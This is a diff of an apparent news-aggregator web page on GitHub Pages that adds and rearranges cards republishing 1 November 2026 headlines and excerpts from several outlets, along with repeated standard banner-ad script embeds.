+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Liverpool v Arsenal LIVE: Reds face big test of title credentials against injury-hit champions", "image": ["https://static.independent.co.uk/2026/11/01/09/2302138906..?width=1200&auto=webp&trim=33%2C0%2C33%2C0"], "datePublished": "2026-11-01T12:55:58+00:00", "dateModified": "2026-11-01T12:55:58+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7925"}</script>
+    <h2>Liverpool v Arsenal LIVE: Reds face big test of title credentials against injury-hit champions</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.independent.co.uk/sport/football/liverpool-arsenal-live-score-result-premier-league-b3076541.html" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://static.independent.co.uk/2026/11/01/09/2302138906..?width=1200&amp;auto=webp&amp;trim=33%2C0%2C33%2C0" alt="Liverpool v Arsenal LIVE: Reds face big test of title credentials against injury-hit champions" loading="lazy"><p>Bukayo Saka is absent as Arsenal seek a first win at Anfield since 2012</p></div>
+</article>
+<article class="article-card" id="artikel-6915">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Canada’s trucking industry racked by non-compliance, training and safety concerns", "image": ["https://www.ctvnews.ca/resizer/v2/EHKMI2A22UMW4LT3BH7BOPZYMA.jpg?auth=d7343377080d63e3baa3cbfcc04b31fabe583a7896da9721ccf23a5f02b75659&smart=true&width=1400&height=1010"], "datePublished": "2026-11-01T12:55:48-04:00", "dateModified": "2026-11-01T12:55:48-04:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-6915"}</script>
+    <h2>Canada’s trucking industry racked by non-compliance, training and safety concerns</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.ctvnews.ca/canada/article/canadas-trucking-industry-racked-by-non-compliance-training-and-safety-concerns/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://www.ctvnews.ca/resizer/v2/EHKMI2A22UMW4LT3BH7BOPZYMA.jpg?auth=d7343377080d63e3baa3cbfcc04b31fabe583a7896da9721ccf23a5f02b75659&amp;smart=true&amp;width=1400&amp;height=1010" alt="Canada’s trucking industry racked by non-compliance, training and safety concerns" loading="lazy">Trucks drive on the Decarie Expressway in Montreal on Saturday, Oct. 24, 2026. THE CANADIAN PRESS/Christinne Muschi</div>
+</article>
+<div style="text-align:center;margin:20px 0;">
+    <script type="text/javascript">
+        atOptions = {
+            'key' : 'f9e40eb3b3cd05f1038aac7b36b33ad2',
+            'format' : 'iframe',
+            'height' : 90,
+            'width' : 728,
+            'params' : {}
+        };
+    </script>
+    <script type="text/javascript" src="https://upholdbrilliancerecast.com/f9e40eb3b3cd05f1038aac7b36b33ad2/invoke.js"></script>
+</div>
+
+<article class="article-card" id="artikel-7927">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Reform and Farage ‘don’t do defence’ in parliament, new analysis shows", "image": ["https://static.independent.co.uk/2026/10/29/15/2302398298..?width=1200&auto=webp&trim=0%2C0%2C0%2C0"], "datePublished": "2026-11-01T12:45:18+00:00", "dateModified": "2026-11-01T12:45:18+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7927"}</script>
+    <h2>Reform and Farage ‘don’t do defence’ in parliament, new analysis shows</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.independent.co.uk/news/uk/politics/farage-reform-defence-parliament-analysis-b3076542.html" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://static.independent.co.uk/2026/10/29/15/2302398298..?width=1200&amp;auto=webp&amp;trim=0%2C0%2C0%2C0" alt="Reform and Farage ‘don’t do defence’ in parliament, new analysis shows" loading="lazy"><p>Analysis of debates in parliament show that Nigel Farage only appeared in less than 5 per cent in defence debates in parliament despite being Reform’s defence spokesman</p></div>
+</article>
+<article class="article-card" id="artikel-7928">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "US warned Russia about planned terror attack on Moscow", "image": ["https://static.independent.co.uk/2026/09/23/16/50/GettyImages-2229442879-2a1505ee.jpeg?width=1200&auto=webp&trim=0%2C1%2C0%2C1"], "datePublished": "2026-11-01T12:44:34+00:00", "dateModified": "2026-11-01T12:44:34+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7928"}</script>
+    <h2>US warned Russia about planned terror attack on Moscow</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.independent.co.uk/bulletin/news/trump-embassy-moscow-attack-tsaritsyno-b3077081.html" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://static.independent.co.uk/2026/09/23/16/50/GettyImages-2229442879-2a1505ee.jpeg?width=1200&amp;auto=webp&amp;trim=0%2C1%2C0%2C1" alt="US warned Russia about planned terror attack on Moscow" loading="lazy"><p></p></div>
+</article>
+<article class="article-card" id="artikel-7929">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Serbia marks the second anniversary of a train station tragedy that fueled student protests", "image": ["https://static.independent.co.uk/2026/11/01/12/Serbia_Canopy_Collapse_48849.jpg?width=1200&auto=webp&crop=3%3A2"], "datePublished": "2026-11-01T12:44:12+00:00", "dateModified": "2026-11-01T12:44:12+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7929"}</script>
+    <h2>Serbia marks the second anniversary of a train station tragedy that fueled student protests</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.independent.co.uk/news/aleksandar-vucic-serbia-people-viktor-orban-rts-b3077082.html" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://static.independent.co.uk/2026/11/01/12/Serbia_Canopy_Collapse_48849.jpg?width=1200&amp;auto=webp&amp;crop=3%3A2" alt="Serbia marks the second anniversary of a train station tragedy that fueled student protests" loading="lazy">Thousands of students and supporters in Serbia have marked two years since a deadly train station disaster</div>
+</article>
+<article class="article-card" id="artikel-7930">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "India’s capital turns into fortress as Modi’s rivals stage new protests against election chief", "image": ["https://static.independent.co.uk/2026/11/01/06/2026-11-01T041504Z_1619866819_RC2REOAWHLHS_RTRMADP_3_INDIA-POLITICS.JPG?width=1200&auto=webp&trim=0%2C0%2C0%2C0"], "datePublished": "2026-11-01T12:43:50+00:00", "dateModified": "2026-11-01T12:43:50+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7930"}</script>
+    <h2>India’s capital turns into fortress as Modi’s rivals stage new protests against election chief</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.independent.co.uk/asia/india/delhi-congress-election-comission-protest-modi-b3077010.html" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://static.independent.co.uk/2026/11/01/06/2026-11-01T041504Z_1619866819_RC2REOAWHLHS_RTRMADP_3_INDIA-POLITICS.JPG?width=1200&amp;auto=webp&amp;trim=0%2C0%2C0%2C0" alt="India’s capital turns into fortress as Modi’s rivals stage new protests against election chief" loading="lazy"><p>Hundreds of thousands of people took to the streets in Delhi to demand the resignation of the country’s chief election commissioner</p></div>
+</article>
+<article class="article-card" id="artikel-3287">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Japan demands release of national in meeting with Russia’s Lavrov", "image": ["https://www.japantimes.co.jp/japantimes/uploads/images/2026/11/01/571647.jpg"], "datePublished": "2026-11-01T12:43:00+09:00", "dateModified": "2026-11-01T12:43:00+09:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-3287"}</script>
+    <h2>Japan demands release of national in meeting with Russia’s Lavrov</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.japantimes.co.jp/news/2026/11/01/japan/politics/japan-russia-g20-meeting/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://www.japantimes.co.jp/japantimes/uploads/images/2026/11/01/571647.jpg" alt="Japan demands release of national in meeting with Russia’s Lavrov" loading="lazy">The rare high-level meeting between the two countries came amid strained ties over Ukraine and a long-running territorial dispute.</div>
+</article>
+<div style="text-align:center;margin:20px 0;">
+    <script type="text/javascript">
+        atOptions = {
+            'key' : 'f9e40eb3b3cd05f1038aac7b36b33ad2',
+            'format' : 'iframe',
+            'height' : 90,
+            'width' : 728,
+            'params' : {}
+        };
+    </script>
+    <script type="text/javascript" src="https://upholdbrilliancerecast.com/f9e40eb3b3cd05f1038aac7b36b33ad2/invoke.js"></script>
+</div>
+
+<article class="article-card" id="artikel-5251">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Phoenix women dealt striker injury blow as winless start continues", "image": ["https://www.stuff.co.nz/media/images/9Tzi8ywRz924XE3uHaD6DZ3Ef+IdbOiYlvIROR5vlqUeRrexTocZGobKRJ9od%2Fgnk3B%2FCeKTmTAsIjj6Q0YaYYLNn124zTGsSVHHeqA5HQlUyxjHacvpFXjkt0byPA0ijNDU6hmpl1S8WhC%2FyD3fdQ7Ae7MMIA6A76lWhPnp4w7rpqf+gTJrC%2FVBWrdaSdG21E5KeQbInjXMGyYe08CQbQl0GcMAZGcT7lvLUkevBoaWqJXqQ6Lb%2FlOjFV3P19a4GhWS9O5e60QaqtF%2F1+IgosXnT5ErpcP+6ykto3wUFthtGLoWmbS2gr6dETuRRQzpCQi3gvoOzZCyi4nWEBhuzgUWD4uShDQO2Beip1r1jZGyyJHC3N8VJIRxGxFmQ9JSEdIvN%2F5nzMRFrx9LwkT1MIfFRdsc1beTNPPz0u3xBjZwmRYFmx7hbScCCgl65UVFFKxaW9Uifs8HQqdegyEwRhh6Tso4rD33OCA1XyefFld0PNyrl5xPI0Z85Z5A50j+JQntptCxcfcFiglyiF8Ivw==?resolution=1240x700"], "datePublished": "2026-11-01T12:39:57Z", "dateModified": "2026-11-01T12:39:57Z", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-5251"}</script>
+    <h2>Phoenix women dealt striker injury blow as winless start continues</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.stuff.co.nz/sport/361053752/wellington-phoenix-women-dealt-makala-woods-injury-blow-loss-perth-glory" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://www.stuff.co.nz/media/images/9Tzi8ywRz924XE3uHaD6DZ3Ef+IdbOiYlvIROR5vlqUeRrexTocZGobKRJ9od%2Fgnk3B%2FCeKTmTAsIjj6Q0YaYYLNn124zTGsSVHHeqA5HQlUyxjHacvpFXjkt0byPA0ijNDU6hmpl1S8WhC%2FyD3fdQ7Ae7MMIA6A76lWhPnp4w7rpqf+gTJrC%2FVBWrdaSdG21E5KeQbInjXMGyYe08CQbQl0GcMAZGcT7lvLUkevBoaWqJXqQ6Lb%2FlOjFV3P19a4GhWS9O5e60QaqtF%2F1+IgosXnT5ErpcP+6ykto3wUFthtGLoWmbS2gr6dETuRRQzpCQi3gvoOzZCyi4nWEBhuzgUWD4uShDQO2Beip1r1jZGyyJHC3N8VJIRxGxFmQ9JSEdIvN%2F5nzMRFrx9LwkT1MIfFRdsc1beTNPPz0u3xBjZwmRYFmx7hbScCCgl65UVFFKxaW9Uifs8HQqdegyEwRhh6Tso4rD33OCA1XyefFld0PNyrl5xPI0Z85Z5A50j+JQntptCxcfcFiglyiF8Ivw==?resolution=1240x700" alt="Phoenix women dealt striker injury blow as winless start continues" loading="lazy">Makala Woods, the scorer of both their goals this season, had to be helped off the field after suffering an ankle injury in the 17th minute.</div>
+</article>
+<article class="article-card" id="artikel-6916">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Poilievre says Carney must keep fiscal promises in upcoming budget", "image": ["https://www.ctvnews.ca/resizer/v2/5XLPXEZMDWIK6XBIJCCFVGK4AE.jpg?auth=35b5d112a4d8ace2244f5ac2490dee8349a6bf50b2ce53861082cdef37eef8c7&smart=true&width=1400&height=1045"], "datePublished": "2026-11-01T12:37:53-04:00", "dateModified": "2026-11-01T12:37:53-04:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-6916"}</script>
+    <h2>Poilievre says Carney must keep fiscal promises in upcoming budget</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.ctvnews.ca/canada/article/poilievre-says-carney-must-keep-fiscal-promises-in-upcoming-budget/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://www.ctvnews.ca/resizer/v2/5XLPXEZMDWIK6XBIJCCFVGK4AE.jpg?auth=35b5d112a4d8ace2244f5ac2490dee8349a6bf50b2ce53861082cdef37eef8c7&amp;smart=true&amp;width=1400&amp;height=1045" alt="Poilievre says Carney must keep fiscal promises in upcoming budget" loading="lazy">Conservative Leader Pierre Poilievre rises during Question Period in the House of Commons on Parliament Hill in Ottawa on Wednesday, Oct. 28, 2026. THE CANADIAN PRESS/Justin Tang</div>
+</article>
+<article class="article-card" id="artikel-7182">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "All Pirate Chest look and rewards in Fortnite Treasure Hunters", "image": [], "datePublished": "2026-11-01T12:36:10+00:00", "dateModified": "2026-11-01T12:36:10+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7182"}</script>
+    
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.destructoid.com/all-pirate-chest-look-and-rewards-in-fortnite-treasure-hunters/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><p>The Treasure Hunters mini-season has spiced up things in <em>Fortnite</em>, as the regular chests will now include valuable items in them. While you can still get the usual stuff, there are some special cosmetics that have also been included in the pool of rewards. </p>    <p>This guide will list every special reward you can find in the chests. Do note that certain rewards will rotate on weekly basis. </p>    
+<h2>Table of contents</h2><ul><li><a href="#h-complete-list-of-treasure-chest-loot-in-fortnite-treasure-hunters">Complete list of Treasure Chest loot in Fortnite Treasure Hunters</a><ul><li><a href="#h-week-1">Week 1</a></li><li><a href="#h-week-2">Week 2</a></li></ul></li></ul>
+    <h2>Complete list of Treasure Chest loot in Fortnite Treasure Hunters</h2>    <p>The table below has mention of all the rewards that will be available in the chests during the first two weeks of the mini-season. </p>    <h3>Week 1</h3>    
+
+TreasureRewardSolid Gold A$AP Rocky GauntletsPickaxeSolid Gold A$AP RockyOutfitPlunder in ParadiseLoading ScreenNo TrespassingJam TrackLucky LocatorGizmoSprite LocatorGizmoGolden FireworkSprite DustPortable ExtractorGizmoExtraction AcceleratorGizmoPirate Shop Access (2026)Item Shop TokenPirate Shop Access (2027)Item Shop TokenGolden Llama CrewVehicle DecalMercedes-AMG G 63 G-WagonVehicle    <h3>Week 2</h3>    
+
+TrasureRewardSolid Gold Lil Uzi VertOutfitLil Uzi CrewBack BlingLondonJam TrackSo KawaiiLoading ScreenGold Cadillac BlackwingVehicle SkinPirate Shop Access (2026)Item Shop TokenPirate Shop Access (2027)Item Shop Token    <p>The <a href="https://www.destructoid.com/how-to-access-the-pirate-shop-and-get-tokens-in-fortnite/">Pirate Shop Access tokens</a> are perhaps the most valuable loot you can find through the course of the mini-season. </p><p>The post <a href="https://www.destructoid.com/all-pirate-chest-look-and-rewards-in-fortnite-treasure-hunters/">All Pirate Chest look and rewards in Fortnite Treasure Hunters</a> appeared first on <a href="https://www.destructoid.com">Destructoid</a>.</p></div>
+</article>
+<article class="article-card" id="artikel-3885">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Clarify crime thresholds and immunity in bid-rigging law: Hong Kong Bar Association", "image": ["https://cdn.i-scmp.com/sites/default/files/styles/1280x720/public/d8/images/canvas/2026/11/01/0eafb7d1-9ff3-49a7-8cc6-379093d01d74_7a3ecf19.jpg?itok=LcT_UUYw&v=1793534966"], "datePublished": "2026-11-01T12:36:05+00:00", "dateModified": "2026-11-01T12:36:05+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-3885"}</script>
+    <h2>Clarify crime thresholds and immunity in bid-rigging law: Hong Kong Bar Association</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.scmp.com/news/hong-kong/law-and-crime/article/3372894/clarify-crime-thresholds-and-immunity-bid-rigging-law-hong-kong-bar-association" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://cdn.i-scmp.com/sites/default/files/styles/1280x720/public/d8/images/canvas/2026/11/01/0eafb7d1-9ff3-49a7-8cc6-379093d01d74_7a3ecf19.jpg?itok=LcT_UUYw&amp;v=1793534966" alt="Clarify crime thresholds and immunity in bid-rigging law: Hong Kong Bar Association" loading="lazy">The Hong Kong Bar Association has called on the government to clearly define criminal thresholds and resolve whistle-blower immunity rules under its plan to outlaw bid-rigging following the deadly Tai Po inferno.
+A task force formed by the association, which represents the city’s barristers, spent 10 months reviewing four key areas of law and published a 140-page report on Sunday in the hope of providing direction to address the shortcomings that led to the deadly Wang Fuk Court blaze last...</div>
+</article>
 <article class="article-card" id="artikel-3248">
     <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "British scientist among 69 killed in Spain train disaster was travelling to collect prestigious award", "image": ["https://static.independent.co.uk/2026/11/01/11/27/Screenshot-2026-11-01-at-11-08-50.png?width=1200&auto=webp&trim=59%2C0%2C151%2C0"], "datePublished": "2026-11-01T12:35:59+00:00", "dateModified": "2026-11-01T12:35:59+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-3248"}</script>
     <h2>British scientist among 69 killed in Spain train disaster was travelling to collect prestigious award</h2>
@@ -216,6 +2119,19 @@ A task force formed by the association, which represents the city’s barristers
     </div>
     <div class="article-body"><img src="https://static.independent.co.uk/2026/11/01/11/27/Screenshot-2026-11-01-at-11-08-50.png?width=1200&amp;auto=webp&amp;trim=59%2C0%2C151%2C0" alt="British scientist among 69 killed in Spain train disaster was travelling to collect prestigious award" loading="lazy"><p>University of Cambridge researcher Dr Marta Shahbazi was on board when two high-speed trains collided near Toledo</p></div>
 </article>
+<div style="text-align:center;margin:20px 0;">
+    <script type="text/javascript">
+        atOptions = {
+            'key' : 'f9e40eb3b3cd05f1038aac7b36b33ad2',
+            'format' : 'iframe',
+            'height' : 90,
+            'width' : 728,
+            'params' : {}
+        };
+    </script>
+    <script type="text/javascript" src="https://upholdbrilliancerecast.com/f9e40eb3b3cd05f1038aac7b36b33ad2/invoke.js"></script>
+</div>
+
 <article class="article-card" id="artikel-3249">
     <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Irish Olympian and European champion Ciara Mageean dies aged 34", "image": ["https://static.independent.co.uk/2026/11/01/10/01M6BAJ7VC3A4X9EA3X7V3E388.jpg?width=1200&auto=webp&trim=0%2C6%2C0%2C6"], "datePublished": "2026-11-01T12:35:26+00:00", "dateModified": "2026-11-01T12:35:26+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-3249"}</script>
     <h2>Irish Olympian and European champion Ciara Mageean dies aged 34</h2>
@@ -252,6 +2168,15 @@ A task force formed by the association, which represents the city’s barristers
     </div>
     <div class="article-body"><img src="https://static0.polygonimages.com/wordpress/wp-content/uploads/2026/10/dragon-delves-gingerbread-people.png" alt="Dungeons &amp; Dragons Turned Hansel and Gretel Into a Near-Perfect Adventure" loading="lazy"><p>Most of the published adventures for <a href="https://www.polygon.com/dnd-dungeons-dragons/">Dungeons &amp; Dragons</a> focus on epic <a href="https://www.polygon.com/fantasy/">fantasy</a>, tasking players with fighting ancient necromancers, rampaging demons, or invading armies in order to prevent some great calamity. But the stakes don’t have to be so high to have a great session, and a bit of whimsy can prove just as memorable as a dramatic battle. That’s why one of my favorite adventures from Wizards of the Coast is a silly fairy tale inspired by Hansel and Gretel.</p></div>
 </article>
+<article class="article-card" id="artikel-2988">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Call of the Wilde: Montreal Canadiens make it five straight wins edging the Pittsburgh Penguins", "image": ["https://globalnews.ca/wp-content/uploads/2026/10/CP177185497.jpg?quality=65&strip=all"], "datePublished": "2026-11-01T12:30:36+00:00", "dateModified": "2026-11-01T12:30:36+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-2988"}</script>
+    <h2>Call of the Wilde: Montreal Canadiens make it five straight wins edging the Pittsburgh Penguins</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://globalnews.ca/news/12128847/call-of-the-wilde-montreal-canadiens-make-it-five-straight-wins-edging-the-pittsburgh-penguins/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://globalnews.ca/wp-content/uploads/2026/10/CP177185497.jpg?quality=65&amp;strip=all" alt="Call of the Wilde: Montreal Canadiens make it five straight wins edging the Pittsburgh Penguins" loading="lazy">The Canadiens were flying on offence against a Penguins team that didn't find a body they wanted to hit.</div>
+</article>
 <div style="text-align:center;margin:20px 0;">
     <script type="text/javascript">
         atOptions = {
@@ -265,15 +2190,6 @@ A task force formed by the association, which represents the city’s barristers
     <script type="text/javascript" src="https://upholdbrilliancerecast.com/f9e40eb3b3cd05f1038aac7b36b33ad2/invoke.js"></script>
 </div>
 
-<article class="article-card" id="artikel-2988">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Call of the Wilde: Montreal Canadiens make it five straight wins edging the Pittsburgh Penguins", "image": ["https://globalnews.ca/wp-content/uploads/2026/10/CP177185497.jpg?quality=65&strip=all"], "datePublished": "2026-11-01T12:30:36+00:00", "dateModified": "2026-11-01T12:30:36+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-2988"}</script>
-    <h2>Call of the Wilde: Montreal Canadiens make it five straight wins edging the Pittsburgh Penguins</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://globalnews.ca/news/12128847/call-of-the-wilde-montreal-canadiens-make-it-five-straight-wins-edging-the-pittsburgh-penguins/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://globalnews.ca/wp-content/uploads/2026/10/CP177185497.jpg?quality=65&amp;strip=all" alt="Call of the Wilde: Montreal Canadiens make it five straight wins edging the Pittsburgh Penguins" loading="lazy">The Canadiens were flying on offence against a Penguins team that didn't find a body they wanted to hit.</div>
-</article>
 <article class="article-card" id="artikel-3886">
     <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Washington’s unending vendetta against Cuba", "image": ["https://cdn.i-scmp.com/sites/default/files/styles/1280x720/public/d8/images/canvas/2026/10/30/589b0a65-be10-40e8-8cf5-7912f8cc3e03_df136933.jpg?itok=Ivqnwde0&v=1793342209"], "datePublished": "2026-11-01T12:30:10+00:00", "dateModified": "2026-11-01T12:30:10+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-3886"}</script>
     <h2>Washington’s unending vendetta against Cuba</h2>
@@ -301,6 +2217,15 @@ The energy blockade is only the latest of America’s crimes against the Cuban p
         <a href="https://nypost.com/2026/11/01/betting/titans-vs-bengals-prediction-nfl-week-8-odds-picks-best-bet/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
     </div>
     <div class="article-body">Two AFC teams heading in opposite directions meet in Cincinnati.</div>
+</article>
+<article class="article-card" id="artikel-5914">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "The 30 Best Gifts for Star Wars Fans (2026)", "image": ["https://media.wired.com/photos/6ac3f7f587319ffac19f963c/master/pass/Star%20Wars%20Gift%20Guide%20102026%20top%20art%20SOURCE%20Amazon.jpg"], "datePublished": "2026-11-01T12:30:00+00:00", "dateModified": "2026-11-01T12:30:00+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-5914"}</script>
+    <h2>The 30 Best Gifts for Star Wars Fans (2026)</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.wired.com/gallery/best-star-wars-gifts/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://media.wired.com/photos/6ac3f7f587319ffac19f963c/master/pass/Star%20Wars%20Gift%20Guide%20102026%20top%20art%20SOURCE%20Amazon.jpg" alt="The 30 Best Gifts for Star Wars Fans (2026)" loading="lazy">From marble runs to advent calendars, these are the best Star Wars gifts for fans of all ages.</div>
 </article>
 <article class="article-card" id="artikel-3250">
     <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Cambridge scientist killed in Spanish train crash was on way to collect prize", "image": ["https://static.independent.co.uk/2026/11/01/11/27/Screenshot-2026-11-01-at-11-08-50.png?width=1200&auto=webp&trim=59%2C0%2C151%2C0"], "datePublished": "2026-11-01T12:28:14+00:00", "dateModified": "2026-11-01T12:28:14+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-3250"}</script>
@@ -1369,364 +3294,6 @@ Image via Epic Games    <p>Once you activate a token, you have 14 days to claim 
         <a href="https://www.aljazeera.com/news/2026/11/1/bulgarians-vote-in-presidential-run-off-amid-black-sea-tensions?traffic_source=rss" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
     </div>
     <div class="article-body">Voters in Bulgaria weigh economic challenges and attacks on ships in a race marked by record low turnout.</div>
-</article>
-<div style="text-align:center;margin:20px 0;">
-    <script type="text/javascript">
-        atOptions = {
-            'key' : 'f9e40eb3b3cd05f1038aac7b36b33ad2',
-            'format' : 'iframe',
-            'height' : 90,
-            'width' : 728,
-            'params' : {}
-        };
-    </script>
-    <script type="text/javascript" src="https://upholdbrilliancerecast.com/f9e40eb3b3cd05f1038aac7b36b33ad2/invoke.js"></script>
-</div>
-
-<article class="article-card" id="artikel-559">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Black Caps player ratings: Tell us how they performed against India", "image": ["https://www.stuff.co.nz/media/images/9Tzi8ywRz924XE3uHaD6DZ3Ef+IdbOiYlvIROR5vlqUeRrexTocZGobKRJ9od%2Fgnk3B%2FCeKTmTAsIjj6Q0YaYU3hEL1b1D3C4mpQuhQ4d7NHA6ahFlxQoCzoj57z1LNoJ3ybCEtAPsd+we9Czeyne2o5v1WamPcOlMZSqd2yXhfhk47EGvH69oFFHSh%2FS4Z922gTpc0nbRLIQkpsAQVmi1T7UE6Rm+U5JOQHG2S6O2lqhn497mzOBH8K3UWW2MEL897zyN3j1QBEj80hcQ91Ei26Ks2dXIA9F261q0Kl0UfoNwJ9TFdIZ%2FQwnLpinLe94UtmMvJE%2FEgv3U5F+1qFWrO6LqwL75VkX5hc8c0+WdIiiPUZPWt6HIwp9rEELX4OqeghKHEZABxSlSJFwuTc7yZBAIVQBxMsMO9XB0YmuD7qj5VpUbMSmqU0cQjvqvLv4DukkLo4znjtFkEWv36GgMsDBDQnKd8LmXBruQvdXpiJ7E8k5ExchD5gqNMWG9hwaJQen%2FCqV+UQCF+vzc6Ujw==?resolution=1240x700"], "datePublished": "2026-11-01T10:42:05Z", "dateModified": "2026-11-01T10:42:05Z", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-559"}</script>
-    <h2>Black Caps player ratings: Tell us how they performed against India</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.stuff.co.nz/sport/361051539/black-caps-player-ratings-tell-us-how-they-performed-fifth-t20-international-win-over-india" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
